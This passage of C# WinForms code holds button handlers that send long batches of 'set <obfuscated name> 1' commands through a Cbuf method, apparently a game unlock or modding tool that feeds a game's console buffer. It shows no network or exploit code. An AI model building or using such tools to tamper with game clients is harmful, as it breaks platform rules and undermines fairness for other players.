            this.Cbuf("set PKOPRQPQP 1");
            this.Cbuf("set LQLQQSSSQQ 1");
            this.Cbuf("set MROMRKROOO 1");
            this.Cbuf("set RNRTLROOR 1");
            this.Cbuf("set OONLORSMO 1");
            this.Cbuf("set MLLRKTPNRR 1");
            this.Cbuf("set TTMKNNPSN 1");
            this.Cbuf("set LNOPORRSOM 1");
            this.Cbuf("set MNQTOKSRKL 1");
            this.Cbuf("set NNROMKSPRT 1");
            this.Cbuf("set RRLSQTNMO 1");
            this.Cbuf("set NNLKSSMTLM 1");
            this.Cbuf("set NSRPSNSOKQ 1");
            this.Cbuf("set OKQMQLNKQO 1");
            this.Cbuf("set MTSRKMTOTL 1");
            this.Cbuf("set MSLLKLMNKS 1");
            this.Cbuf("set LMSLMNORNR 1");
            this.Cbuf("set LMNMLOKNN 1");
            this.Cbuf("set NKSMRLMRKR 1");
            this.Cbuf("set NRRNKOSKQK 1");
            this.Cbuf("set LTMQNPRLN 1");
            this.Cbuf("set MLQKTPMNMO 1");
            this.Cbuf("set MMRTPTQOKS 1");
            this.Cbuf("set MMMPPQSTKP 1");
            this.Cbuf("set SOPSMLMMP 1");
            this.Cbuf("set RPRTRPRLL 1");
            this.Cbuf("set NKMMNOOQSP 1");
            this.Cbuf("set LSLKPOQQSO 1");
            this.Cbuf("set MPMQRSMQMK 1");
        }

        private void metroButton35_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LPPSPNPOSM 1");
            this.Cbuf("set LRLPQNTMMQ 1");
            this.Cbuf("set OLKOPPKTOM 1");
            this.Cbuf("set MKNLTNLPKT 1");
            this.Cbuf("set OMPOMRTNRM 1");
            this.Cbuf("set MLSLQPTTNT 1");
            this.Cbuf("set LKTKOKPKQ 1");
            this.Cbuf("set LQRTSOPOKO 1");
            this.Cbuf("set NMSOPLSSKL 1");
            this.Cbuf("set MSMOKPTNKS 1");
            this.Cbuf("set MROPKMTMLN 1");
            this.Cbuf("set LNTMQKOQKN 1");
            this.Cbuf("set LNKPMTSNMR 1");
            this.Cbuf("set NQKNLQSLOP 1");
            this.Cbuf("set NLPLNQSNNR 1");
            this.Cbuf("set NMKLQPLSQM 1");
            this.Cbuf("set LTKNPSMTMT 1");
            this.Cbuf("set QPRSOMMSN 1");
            this.Cbuf("set LNQKSKSLRR 1");
            this.Cbuf("set LSOQLMLSPQ 1");
            this.Cbuf("set MSLTLPQOTM 1");
            this.Cbuf("set MSSMMTNTLP 1");
            this.Cbuf("set SLSPNLSQP 1");
            this.Cbuf("set NMOQOMONLQ 1");
            this.Cbuf("set LSMSTOQNTT 1");
            this.Cbuf("set LMNOSOLQLT 1");
            this.Cbuf("set NKTRLMSRNR 1");
            this.Cbuf("set LLLTQOOTPO 1");
            this.Cbuf("set NKSSQOPQQP 1");
            this.Cbuf("set MKSMNLRMML 1");
            this.Cbuf("set LSMPNKQMKS 1");
            this.Cbuf("set NKRKKSTRRO 1");
            this.Cbuf("set NOORNQMNM 1");
            this.Cbuf("set NOLPSOTORP 1");
            this.Cbuf("set MOQSSOPLKP 1");
            this.Cbuf("set NTMKTPSRO 1");
            this.Cbuf("set NQNOSLMSKT 1");
            this.Cbuf("set STSPNNNOS 1");
            this.Cbuf("set SOQOQQNNT 1");
            this.Cbuf("set MQMTLNKTMN 1");
            this.Cbuf("set LKRSRPORTN 1");
            this.Cbuf("set LKKMQRSKTS 1");
            this.Cbuf("set LLPPLMRKKQ 1");
            this.Cbuf("set LMTKRNOTT 1");
            this.Cbuf("set QLLPPNNNP 1");
            this.Cbuf("set NMQRLKTPL 1");
            this.Cbuf("set LNLNTQQNN 1");
            this.Cbuf("set LOPSQLMKPO 1");
            this.Cbuf("set LQNPKMTTPL 1");
            this.Cbuf("set NQNTKQQRTQ 1");
        }

        private void metroButton34_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set NSTKSMPROK 1");
            this.Cbuf("set MTLPRSKKST 1");
            this.Cbuf("set LTOPQLROPR 1");
            this.Cbuf("set MMPLKPMOMK 1");
            this.Cbuf("set MTNORPNTLL 1");
            this.Cbuf("set LRQLQQPPNT 1");
            this.Cbuf("set MLTTQQNSSQ 1");
            this.Cbuf("set NLMSTOMKNR 1");
            this.Cbuf("set LLLRKRROOP 1");
            this.Cbuf("set NPRMROSQTN 1");
            this.Cbuf("set QLQPTPLNN 1");
            this.Cbuf("set LNKLOMQOS 1");
            this.Cbuf("set LPPROKMPPS 1");
            this.Cbuf("set OKTKNPTSPP 1");
            this.Cbuf("set QNOQQRSQO 1");
            this.Cbuf("set NKRQMPKQML 1");
            this.Cbuf("set LKNMLOSRPP 1");
            this.Cbuf("set NSMLPOKPLS 1");
            this.Cbuf("set QNKLPNRKN 1");
            this.Cbuf("set NMTPKOTOTL 1");
            this.Cbuf("set NSPNNSMKSP 1");
            this.Cbuf("set OLSQPSQLTK 1");
            this.Cbuf("set MRNKTKLLKP 1");
            this.Cbuf("set NQONMTOOTS 1");
            this.Cbuf("set NQLPNORONS 1");
            this.Cbuf("set NQTLQOTLL 1");
            this.Cbuf("set MPOOMRMSML 1");
            this.Cbuf("set LROTTMQLQO 1");
            this.Cbuf("set LSQQNTRKKL 1");
            this.Cbuf("set NLNLNLKNQM 1");

        }

        private void metroButton6_Click_18(object sender, EventArgs e)
        {
            this.Cbuf("set LTTLOLKPQP 1");
            this.Cbuf("set PTOTPLMNR 1");
            this.Cbuf("set MLPMKONLSM 1");
            this.Cbuf("set MQMSQPPSMR 1");
            this.Cbuf("set PPQKNQNTO 1");
            this.Cbuf("set NSMNKSTNLL 1");
            this.Cbuf("set LSSQNNPMTT 1");
            this.Cbuf("set NSQSPRLNOT 1");
            this.Cbuf("set NPNPOQLRRP 1");
            this.Cbuf("set MTKKTTOK 1");
            this.Cbuf("set MNMRPKQNKQ 1");
            this.Cbuf("set LKPKOSQSRS 1");
            this.Cbuf("set OMPNQKNLRN 1");
            this.Cbuf("set NTSPPKTNK 1");
        }

        private void metroButton8_Click_7(object sender, EventArgs e)
        { 
            this.Cbuf("set NSSPMPLRQL 1");
            this.Cbuf("set MKRSSOQLML 1");
            this.Cbuf("set NPORSPPNOK 1");
            this.Cbuf("set OQSOKOKRQ 1");
            this.Cbuf("set MQPLMMMPRT 1");
            this.Cbuf("set LTKQTLPOLT 1");
            this.Cbuf("set LNNQQMNNPM 1");
            this.Cbuf("set MPPMOTSLNN 1");
            this.Cbuf("set LMTMRLMOT 1");
        }

        private void metroButton21_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set MLMMSONQMQ 1");
            this.Cbuf("set NKMKNNLOTK 1");
            this.Cbuf("set LRTMOMKOLS 1");
            this.Cbuf("set MMTRTMPLON 1");
            this.Cbuf("set MLRRQLNRNP 1");
            this.Cbuf("set NLQSRKOKKK 1");
            this.Cbuf("set NNSSPPRQKM 1");
            this.Cbuf("set MLSRTRQRKR 1");
            this.Cbuf("set MNRQLMKLKL 1");
            this.Cbuf("set MKMNRNNKK 1");
            this.Cbuf("set MSPTLTSQRS 1");
            this.Cbuf("set OMPNTNLMSO 1");
            this.Cbuf("set RLTQMLOM 1");
            this.Cbuf("set QTTLONPKS 1");
        }

        private void metroButton17_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set LPSPNKLRPO 1");
            this.Cbuf("set MKNMSLSLRL 1");
            this.Cbuf("set NMORQOTSK 1");
            this.Cbuf("set RMLOTKMMM 1");
            this.Cbuf("set LNQSSLTOSP 1");
            this.Cbuf("set LSOPQMRPNR 1");
            this.Cbuf("set NKTRSSTMRQ 1");
            this.Cbuf("set MLTTMLTKOR 1");
            this.Cbuf("set OMRQKMSSPP 1");
            this.Cbuf("set TMTNNMTLL 1");
            this.Cbuf("set LMLTRQKKTL 1");
            this.Cbuf("set LNLLSQTRLM 1");
        }

        private void metroButton10_Click_13(object sender, EventArgs e)
        {
            this.Cbuf("set NPQTOLNKQK 1");
            this.Cbuf("set LROQRPMRLO 1");
            this.Cbuf("set NPLRNORLRN 1");
            this.Cbuf("set NQTSSTNORP 1");
            this.Cbuf("set MQLORKOKOR 1");
            this.Cbuf("set MMRMQOLLSQ 1");
            this.Cbuf("set LROORPNKNN 1");
            this.Cbuf("set MMNMQTSOSP 1");
            this.Cbuf("set LMTNLRSPSN 1");
            this.Cbuf("set NNMPPPMOSR 1");
            this.Cbuf("set SQTTTTNQP 1");
            this.Cbuf("set OKOSKLQSPS 1");
            this.Cbuf("set LPTSOPRMQL 1");
            this.Cbuf("set ONSPMLPMK 1");
            this.Cbuf("set MRMRQNPPOT 1");
        }

        private void metroButton11_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set NNONNSLOPM 1");
            this.Cbuf("set LLKLOMTMNS 1");
            this.Cbuf("set NNNSPLTKLL 1");
            this.Cbuf("set MTPOKSNNRL 1");
            this.Cbuf("set NNQKKTLSKM 1");
            this.Cbuf("set OKMKNSQTTO 1");
            this.Cbuf("set NRQNOQMOPS 1");
            this.Cbuf("set MTONTNKOKR 1");
            this.Cbuf("set LLLOMMRTOO 1");
            this.Cbuf("set LKPPLTOMQ 1");
            this.Cbuf("set LNKOKNKNRL 1");
            this.Cbuf("set PLRMKOOOP 1");
            this.Cbuf("set MKLOPMQRPS 1");
            this.Cbuf("set NSMPRLQKNR 1");
            this.Cbuf("set LRMQSLPTMP 1");
        }

        private void metroButton4_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set NOOPRPQTQN 1");
            this.Cbuf("set LQSRRTOKNN 1");
            this.Cbuf("set OLPQMMPMMM 1");
            this.Cbuf("set LLNPKTTLQN 1");
            this.Cbuf("set LONMLLOSKQ 1");
            this.Cbuf("set MNLRLKNQNR 1");
            this.Cbuf("set LOSPTTQRSQ 1");
            this.Cbuf("set MTQTTTMSPS 1");
            this.Cbuf("set LSQSKKLSQL 1");
            this.Cbuf("set NPSOQNKNLS 1");
            this.Cbuf("set NSROOQNTRQ 1");
            this.Cbuf("set MNMOLKRRPN 1");
            this.Cbuf("set LTLQTRKRQR 1");
            this.Cbuf("set LRPSTLOMSK 1");
            this.Cbuf("set MLOSPOTNPN 1");
            this.Cbuf("set MMRQOORMSS 1");
            this.Cbuf("set LSPNSMSRMP 1");
            this.Cbuf("set NOSPSPKLQT 1");
            this.Cbuf("set LSPTRONQSS 1");
            this.Cbuf("set MSKNSKROQR 1");
            this.Cbuf("set NKONSTLPQM 1");
            this.Cbuf("set NKQKOQOKKL 1");
            this.Cbuf("set LTKLSQSTSL 1");
            this.Cbuf("set MKOTOLNKNP 1");
            this.Cbuf("set SRNQLTNRM 1");
            this.Cbuf("set LQLQPLLRKS 1");
            this.Cbuf("set NSNPNTOTKK 1");
            this.Cbuf("set LRKNOPQMTN 1");
            this.Cbuf("set SQRRQMQKR 1");
            this.Cbuf("set MMQORROKKL 1");
            this.Cbuf("set MPMLTPNTKP 1");
            this.Cbuf("set LKNNNNRNQM 1");
            this.Cbuf("set MLSSPKORT 1");
            this.Cbuf("set OLRNNTSOPQ 1");
            this.Cbuf("set LKRKQRPQN 1");
            this.Cbuf("set LTSQQPOLKS 1");
            this.Cbuf("set MNTSNKNRM 1");
            this.Cbuf("set LLPQMMPKRQ 1");
        }

        private void metroButton5_Click_18(object sender, EventArgs e)
        {
            this.Cbuf("set NPNPPPSTTP 1");
            this.Cbuf("set OKKKLTTOPT 1");
            this.Cbuf("set LQRSLPKKKS 1");
            this.Cbuf("set LRNSPTNQOT 1");
            this.Cbuf("set MROOLSPRTQ 1");
            this.Cbuf("set NOONSLPLPS 1");
            this.Cbuf("set LTTQPRLRLP 1");
            this.Cbuf("set LRPKLLSRNM 1");
            this.Cbuf("set MNTRQNQNML 1");
            this.Cbuf("set STPKKTPSR 1");
            this.Cbuf("set LSRRQNNMNS 1");
            this.Cbuf("set MRNRPRPMLK 1");
            this.Cbuf("set MLNRPTSSQQ 1");
            this.Cbuf("set RLKSTRLQQ 1");
            this.Cbuf("set MPOSSTMTSN 1");
            this.Cbuf("set OMLSQKPQMM 1");
            this.Cbuf("set NPTNMOTON 1");
            this.Cbuf("set RKLKRQNQT 1");
            this.Cbuf("set MKMRRLNRTM 1");
            this.Cbuf("set NOQLNPSLSO 1");
            this.Cbuf("set NPROKNLRML 1");
            this.Cbuf("set OMLOLKQQOP 1");
            this.Cbuf("set NMPRQQMSNN 1");
            this.Cbuf("set LQPMKKRNTQ 1");
            this.Cbuf("set NSKNMSMOLP 1");
            this.Cbuf("set NOQKLLMRO 1");
            this.Cbuf("set NLLRSSOQMQ 1");
            this.Cbuf("set NOOMOKPQSN 1");
            this.Cbuf("set OKPKSNONLP 1");
            this.Cbuf("set RTLQNRRTQ 1");
            this.Cbuf("set MTTRMPQTM 1");
            this.Cbuf("set OKOORPKNLK 1");
            this.Cbuf("set LPMLSTLTK 1");
            this.Cbuf("set LNTKPSKRLT 1");
            this.Cbuf("set LSPMLKKRQK 1");
            this.Cbuf("set LLMTMTSPQP 1");
            this.Cbuf("set QLKRMMPS 1");
        }

        private void metroButton6_Click_19(object sender, EventArgs e)
        {
            this.Cbuf("set NMKKQOPKPL 1");
            this.Cbuf("set SNLPLNKOR 1");
            this.Cbuf("set OMLRNPNKO 1");
            this.Cbuf("set LLMOTOSKTT 1");
            this.Cbuf("set MKLTMTLMKM 1");
            this.Cbuf("set SLSNOMTOM 1");
            this.Cbuf("set MRMTMQOOQQ 1");
            this.Cbuf("set MLPOMRKQTP 1");
            this.Cbuf("set LLQRQPNLMQ 1");
            this.Cbuf("set NTMPKLMPNS 1");
            this.Cbuf("set PQOOSLLST 1");
            this.Cbuf("set MMONNP 1");
            this.Cbuf("set SSONROMQM 1");
            this.Cbuf("set MOMMTNTLT 1");
            this.Cbuf("set RRPKSPRSK 1");
            this.Cbuf("set OLROLKKOLN 1");
            this.Cbuf("set MLKLOSKTSK 1");
            this.Cbuf("set TKLLLLOMQ 1");
            this.Cbuf("set OKOQPMQQNM 1");
            this.Cbuf("set PPRTMPMQM 1");
            this.Cbuf("set NRQNRRPPRT 1");
            this.Cbuf("set NQTORMMOPP 1");
            this.Cbuf("set LMQOSKPSKS 1");
            this.Cbuf("set MTKSLMPPOP 1");
            this.Cbuf("set MPKQTRSQOQ 1");
            this.Cbuf("set NPLKRKQTLQ 1");
            this.Cbuf("set NLQKKTOKOR 1");
            this.Cbuf("set NPTSPKORSN 1");
            this.Cbuf("set NOTLLMMTSK 1");
            this.Cbuf("set MRNKMRQMSO 1");
            this.Cbuf("set LPLLQNKMRO 1");
            this.Cbuf("set RTQRSLKPP 1");
            this.Cbuf("set MOPQNKNST 1");
            this.Cbuf("set NPKRRSQMKO 1");
            this.Cbuf("set NKKQSMTRRL 1");
            this.Cbuf("set PTTNNPMO 1");
            this.Cbuf("set MLQSPSTNNP 1");
            this.Cbuf("set NLTOOOSOQQ 1");
            this.Cbuf("set LOPMQLPKL 1");
            this.Cbuf("set LQKKNSKPKQ 1");
            this.Cbuf("set ORNKNTOQ 1");
            this.Cbuf("set PLQNSNTQ 1");
            this.Cbuf("set LOMSTRTLML 1");
            this.Cbuf("set PKNPMMMTP 1");
            this.Cbuf("set LKRSQMMNL 1");
            this.Cbuf("set NNTKTKKKMS 1");
            this.Cbuf("set MTRMLMRTLK 1");
            this.Cbuf("set LMQLLPPTNK 1");
            this.Cbuf("set STQLSKNMQ 1");
            this.Cbuf("set OLTPSKTONP 1");
            this.Cbuf("set NKLNTTLSQN 1");
            this.Cbuf("set NOTLNLRTNS 1");
            this.Cbuf("set NNPNOKPTLS 1");
            this.Cbuf("set MKQLTKMPSP 1");
            this.Cbuf("set MRQRLKPNT 1");
            this.Cbuf("set LTMROMSOLS 1");
            this.Cbuf("set LQKLPMTKMO 1");
            this.Cbuf("set NMRRMROKNT 1");
            this.Cbuf("set LMROKRKONR 1");
            this.Cbuf("set NPSTTRSRPK 1");
            this.Cbuf("set OLRSMNPLNK 1");
            this.Cbuf("set LOQMTLSRSQ 1");
            this.Cbuf("set MQQPKLNPRS 1");
            this.Cbuf("set LOTTOKMSLQ 1");
        }

        private void metroButton9_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set PNROPNLNS 1");
            this.Cbuf("set QOOMNOTO 1");
            this.Cbuf("set MOSKRLOMNS 1");
            this.Cbuf("set MMOMSSKRPO 1");
            this.Cbuf("set NQKROOOLQN 1");
            this.Cbuf("set NPQKMRRTSN 1");
            this.Cbuf("set NORPRRSMRO 1");
            this.Cbuf("set MNRRQNLLRQ 1");
            this.Cbuf("set SLKLOSLLS 1");
            this.Cbuf("set MPKPKPLO 1");
            this.Cbuf("set MLLPPLRQQR 1");
            this.Cbuf("set NMKSTNOMOK 1");
            this.Cbuf("set MMQKPQQOOR 1");
            this.Cbuf("set MSPSKQOMOS 1");
            this.Cbuf("set MSMLQTRTTK 1");
            this.Cbuf("set LKKQLKNOOQ 1");
            this.Cbuf("set LLQPPKKPRT 1");
            this.Cbuf("set OKNKOOOPSR 1");
            this.Cbuf("set LTMPNSLRLK 1");
            this.Cbuf("set PTLRPLQLQ 1");
            this.Cbuf("set NQONSPMOMS 1");
            this.Cbuf("set LOQSTMOTMS 1");
            this.Cbuf("set SLKOSLKLS 1");
            this.Cbuf("set NMSLPPRNNN 1");
            this.Cbuf("set MQQMQQPQRL 1");
            this.Cbuf("set NLLMRMSTLT 1");
            this.Cbuf("set MMMSRMPSKS 1");
            this.Cbuf("set NSMPTPRLNQ 1");
            this.Cbuf("set NNSKKSSNPN 1");
            this.Cbuf("set LNPMLQOLQL 1");
            this.Cbuf("set MKRMPPPTPM 1");
            this.Cbuf("set NONPRKQSS 1");
            this.Cbuf("set LQORTPMNLL 1");
            this.Cbuf("set NPLKLQMNPL 1");
            this.Cbuf("set MOOMTQSMPS 1");
            this.Cbuf("set LPOPTLTKR 1");
            this.Cbuf("set LOOTLTLRNN 1");
            this.Cbuf("set NLTMKNTMSL 1");
        }

        private void metroButton13_Click_13(object sender, EventArgs e)
        {
            this.Cbuf("set NRRRMMSOLP 1");
            this.Cbuf("set NTSTSTRPTO 1");
            this.Cbuf("set LMTTMSNLLR 1");
            this.Cbuf("set MPOPKKONQO 1");
            this.Cbuf("set MNKMMQMSOS 1");
            this.Cbuf("set MQSTRMLMST 1");
            this.Cbuf("set MRKQKRMMMP 1");
            this.Cbuf("set LKNSOOTMTM 1");
            this.Cbuf("set NMSMNMKNSK 1");
            this.Cbuf("set MTNMKMKKRQ 1");
            this.Cbuf("set NTLOSSSOTR 1");
            this.Cbuf("set NLPSQMQRTP 1");
            this.Cbuf("set MNPKLOKLNK 1");
            this.Cbuf("set LSSTNMLMQM 1");
            this.Cbuf("set PRQMMTLNM 1");
            this.Cbuf("set MQPSPTNLLP 1");
            this.Cbuf("set LORKLOOKKT 1");
            this.Cbuf("set LOSLTNTQT 1");
            this.Cbuf("set OKTKQKMTSQ 1");
            this.Cbuf("set LLLPMRSLLN 1");
            this.Cbuf("set OMSNMNMOKN 1");
            this.Cbuf("set NRPRQKQTLQ 1");
            this.Cbuf("set NMROPTKMTQ 1");
            this.Cbuf("set NOKLQNLNKQ 1");
            this.Cbuf("set MPPNKPSNKM 1");
            this.Cbuf("set NQPTNLRTPO 1");
            this.Cbuf("set NMRKPSTNQO 1");
            this.Cbuf("set OLPOMMRMNL 1");
            this.Cbuf("set LRNOTROKT 1");
            this.Cbuf("set LORRMQTSRS 1");
            this.Cbuf("set TPSOSKNMM 1");
            this.Cbuf("set LOONNQSTSM 1");
            this.Cbuf("set NMSTSKPRQQ 1");
            this.Cbuf("set LMQPRMTOSO 1");
            this.Cbuf("set LQRMTPPMQP 1");
            this.Cbuf("set NSPQSTSNOK 1");
            this.Cbuf("set NTLOROTPQR 1");
            this.Cbuf("set NMMNPNLLQM 1");
            this.Cbuf("set RLPRTPPQM 1");
            this.Cbuf("set MOOSMQQPSQ 1");
            this.Cbuf("set NOTKKOKSQO 1");
            this.Cbuf("set NMLTRQRNTM 1");
            this.Cbuf("set MMSMTNRMKL 1");
            this.Cbuf("set LLOSQQTKTN 1");
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void metroButton4_Click_8(object sender, EventArgs e)
        {
            this.Cbuf("set MPOOMRMSML 1");
            this.Cbuf("set LROTTMQLQO 1");
            this.Cbuf("set LSQQNTRKKL 1");
            this.Cbuf("set NLNLNLKNQM 1");
        }

        private void metroButton5_Click_19(object sender, EventArgs e)
        {
            this.Cbuf("set NSTKSMPROK 1");
            this.Cbuf("set MTLPRSKKST 1");
            this.Cbuf("set LTOPQLROPR 1");
            this.Cbuf("set MMPLKPMOMK 1");
            this.Cbuf("set MTNORPNTLL 1");
            this.Cbuf("set LRQLQQPPNT 1");
            this.Cbuf("set MLTTQQNSSQ 1");
        }

        private void metroButton6_Click_20(object sender, EventArgs e)
        {
            this.Cbuf("set NLMSTOMKNR 1");
            this.Cbuf("set LLLRKRROOP 1");
            this.Cbuf("set NPRMROSQTN 1");
            this.Cbuf("set QLQPTPLNN 1");
            this.Cbuf("set LNKLOMQOS 1");
            this.Cbuf("set LPPROKMPPS 1");
            this.Cbuf("set OKTKNPTSPP 1");
            this.Cbuf("set QNOQQRSQO 1");
        }

        private void metroButton9_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set NKRQMPKQML 1");
            this.Cbuf("set LKNMLOSRPP 1");
            this.Cbuf("set NSMLPOKPLS 1");
            this.Cbuf("set QNKLPNRKN 1");
            this.Cbuf("set NMTPKOTOTL 1");
            this.Cbuf("set NSPNNSMKSP 1");
        }

        private void metroButton53_Click(object sender, EventArgs e)
        {
            this.Cbuf("set OLSQPSQLTK 1");
            this.Cbuf("set MRNKTKLLKP 1");
            this.Cbuf("set NQONMTOOTS 1");
            this.Cbuf("set NQLPNORONS 1");
            this.Cbuf("set NQTLQOTLL 1");
        }

        private void metroButton4_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set LNLLSQTRLM 1");
        }

        private void metroButton9_Click_7(object sender, EventArgs e)
        {
            this.Cbuf("set LPSPNKLRPO 1");
        }

        private void metroButton5_Click_20(object sender, EventArgs e)
        {
            this.Cbuf("set MKNMSLSLRL 1");
        }

        private void metroButton13_Click_14(object sender, EventArgs e)
        {
            this.Cbuf("set NMORQOTSK 1");
        }

        private void metroButton34_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set RMLOTKMMM 1");
        }

        private void metroButton53_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LNQSSLTOSP 1");
        }

      

        private void metroButton54_Click(object sender, EventArgs e)
        {
            this.Cbuf("set NKTRSSTMRQ 1");
        }

        private void metroButton57_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton56_Click(object sender, EventArgs e)
        {
            this.Cbuf("set OMRQKMSSPP 1");
        }

        private void metroButton59_Click(object sender, EventArgs e)
        {
            this.Cbuf("set TMTNNMTLL 1");
        }

        private void metroButton58_Click(object sender, EventArgs e)
        {
            this.Cbuf("set LMLTRQKKTL 1");
        }

        private void metroButton37_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set MNNMPMRSLT 1");
            this.Cbuf("set TKNOSKTON 1");
            this.Cbuf("set NPMRNRNPPT 1");
            this.Cbuf("set NMLQLKNPRP 1");
            this.Cbuf("set RQQORRRQT 1");
            this.Cbuf("set NTPOKONPNQ 1");
            this.Cbuf("set NNMTTPLMKN 1");
            this.Cbuf("set LQLTOQSRNO 1");
            this.Cbuf("set MPKLOLKTLR 1");
            this.Cbuf("set QTMTSNTNO 1");
            this.Cbuf("set LMOTKRTOKP 1");
            this.Cbuf("set LPOPSQLKT 1");
            this.Cbuf("set SQKMQKTOT 1");
            this.Cbuf("set NMRROQTQQQ 1");
            this.Cbuf("set OKTNRQQMNS 1");
            this.Cbuf("set LLRLORNPMS 1");
            this.Cbuf("set NLMOTKKLKK 1");
            this.Cbuf("set NLORMOLLMR 1");
            this.Cbuf("set LOMLNTKNQT 1");
            this.Cbuf("set SKLKPMSRT 1");
            this.Cbuf("set MLOKOLORMO 1");
            this.Cbuf("set QORQLMRPP 1");
            this.Cbuf("set LSTTSQNTKP 1");
            this.Cbuf("set NMOLNMOSOM 1");
            this.Cbuf("set MPTSLQLRR 1");
            this.Cbuf("set MLRSOTSSQQ 1");
            this.Cbuf("set NSOMRKSPO 1");
            this.Cbuf("set LTNQSKLMTN 1");
        }

        private void metroButton36_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set MKRMPPPOK 1");
            this.Cbuf("set TLQPOMORK 1");
            this.Cbuf("set OKLQKPPKPQ 1");
            this.Cbuf("set ONKQOSSTR 1");
            this.Cbuf("set NLLLORPQQT 1");
            this.Cbuf("set NMRKMSMTOO 1");
            this.Cbuf("set LLTNTOTMMT 1");
            this.Cbuf("set NKQOMLOSN 1");
            this.Cbuf("set PPNORSOSS 1");
            this.Cbuf("set LQTPNKKMOP 1");
            this.Cbuf("set MSSPLOROPP 1");
            this.Cbuf("set LLPPPNKTSO 1");
            this.Cbuf("set MPTTMMKST 1");
            this.Cbuf("set OLMSPQPNNL 1");
            this.Cbuf("set OMPKLSORSL 1");
            this.Cbuf("set LKNOKRSKL 1");
            this.Cbuf("set PTKLRRLLQ 1");
            this.Cbuf("set LSTMNLPNOP 1");
            this.Cbuf("set LNTSRPMPRQ 1");
            this.Cbuf("set MNKONSOLT 1");
            this.Cbuf("set SPLRMSQLK 1");
            this.Cbuf("set MLMOSSMNOO 1");
            this.Cbuf("set MSLNPQSPLM 1");
            this.Cbuf("set MRKPMKMRQL 1");
            this.Cbuf("set NQQNNPQPKR 1");
            this.Cbuf("set NQPNSRQLRK 1");
            this.Cbuf("set NLQQLQRKSM 1");
            this.Cbuf("set LONMSRNMSK 1");
            this.Cbuf("set MKONQNTMKQ 1");
            this.Cbuf("set MPKPOPRTLQ 1");
        }

        private void metroButton35_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LRTLMMOTML 1");
            this.Cbuf("set MKMOPQKMPO 1");
            this.Cbuf("set MTSPMPOSTO 1");
            this.Cbuf("set SQMORMQQS 1");
            this.Cbuf("set OMOTRTTLNP 1");
            this.Cbuf("set MONMLLPPNM 1");
            this.Cbuf("set NMNKPRTLNK 1");
            this.Cbuf("set LONRSPLKTQ 1");
            this.Cbuf("set OQPSRMPQR 1");
            this.Cbuf("set LOOPRQLLSP 1");
            this.Cbuf("set LNTNNNROSO 1");
            this.Cbuf("set LSPMRPTTSN 1");
            this.Cbuf("set MKKSSPOQLS 1");
            this.Cbuf("set OQOLNROTN 1");
            this.Cbuf("set MQOKNPSQSS 1");
            this.Cbuf("set TRNTNQRNT 1");
            this.Cbuf("set OMQOTKPNNR 1");
            this.Cbuf("set LPSKPTRSTN 1");
            this.Cbuf("set STPRNMNLM 1");
            this.Cbuf("set MKMRLRTMRQ 1");
            this.Cbuf("set OKQOTSKSKS 1");
            this.Cbuf("set LQLNSSKMPK 1");
            this.Cbuf("set MLSNMOMROM 1");
            this.Cbuf("set NQKLKLRMKT 1");
            this.Cbuf("set NSNPQTSNNO 1");
            this.Cbuf("set NPMSLRLLSO 1");
            this.Cbuf("set LPRQOKRKRO 1");
            this.Cbuf("set OLOMPKQMTN 1");
            this.Cbuf("set MLQPTSTOQS 1");
            this.Cbuf("set NKMNKRKPPO 1");
            this.Cbuf("set ONMOSQNON 1");
            this.Cbuf("set MRTTPMOROL 1");
            this.Cbuf("set OLPMRQOSSN 1");
            this.Cbuf("set MKOLPLNNPN 1");
            this.Cbuf("set LKPQPONTNO 1");
        }

        private void metroButton32_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set MPORMORMMN 1");
            this.Cbuf("set ORPPKMSNR 1");
            this.Cbuf("set TMOSQKLNL 1");
            this.Cbuf("set NPQLNONPPT 1");
            this.Cbuf("set LLQQKRNSTO 1");
            this.Cbuf("set SRMPNOKSR 1");
            this.Cbuf("set LOKROKPLRO 1");
            this.Cbuf("set MKPLLOSRMO 1");
            this.Cbuf("set PLQTORNQP 1");
            this.Cbuf("set MNRKSMPQOP 1");
            this.Cbuf("set LQLQQRMOPT 1");
            this.Cbuf("set LNKTLPTSPQ 1");
            this.Cbuf("set MKTNMNORT 1");
            this.Cbuf("set NKMRRRQNQT 1");
            this.Cbuf("set OMOQNNQMOR 1");
            this.Cbuf("set LOPQTKKLPQ 1");
            this.Cbuf("set NTRNQQROTM 1");
            this.Cbuf("set NRPLLPSPOR 1");
            this.Cbuf("set NQTTTQKRRL 1");
            this.Cbuf("set MNPTNPNLMK 1");
            this.Cbuf("set LOLOTKQLLN 1");
            this.Cbuf("set OMMKPSMQOL 1");
            this.Cbuf("set OQLRMLRK 1");
            this.Cbuf("set NMMMNQPNTO 1");
            this.Cbuf("set OMKLNPPNSM 1");
            this.Cbuf("set TQOTNSOPL 1");
            this.Cbuf("set LMLPNTMPN 1");
            this.Cbuf("set MLKLTQRSPM 1");
            this.Cbuf("set NOQQMMQMMR 1");
            this.Cbuf("set ?MLOSSMQQSL 1");
            this.Cbuf("set MOKKSMSRPQ 1");
            this.Cbuf("set LPOTLQSKLT 1");
            this.Cbuf("set NRQKSNRORT 1");
            this.Cbuf("set TTNNQLPTQ 1");
            this.Cbuf("set MQRQQNTRSO 1");
            this.Cbuf("set MOTTNQKORK 1");
            this.Cbuf("set LQQSKRTMMN 1");
            this.Cbuf("set SQRQRQOKO 1");
            this.Cbuf("set MMPTROLLTQ 1");
            this.Cbuf("set MPSQRMTPTL 1");
            this.Cbuf("set SKSNNRNQQ 1");
            this.Cbuf("set LSNMOLPNPP 1");
            this.Cbuf("set NKLNROKPQO 1");
            this.Cbuf("set NPKOTOKTKR 1");
            this.Cbuf("set ?MTSKSOSTML 1");
            this.Cbuf("set LLOKQOSPPP 1");
            this.Cbuf("set LNKMOSLNMN 1");
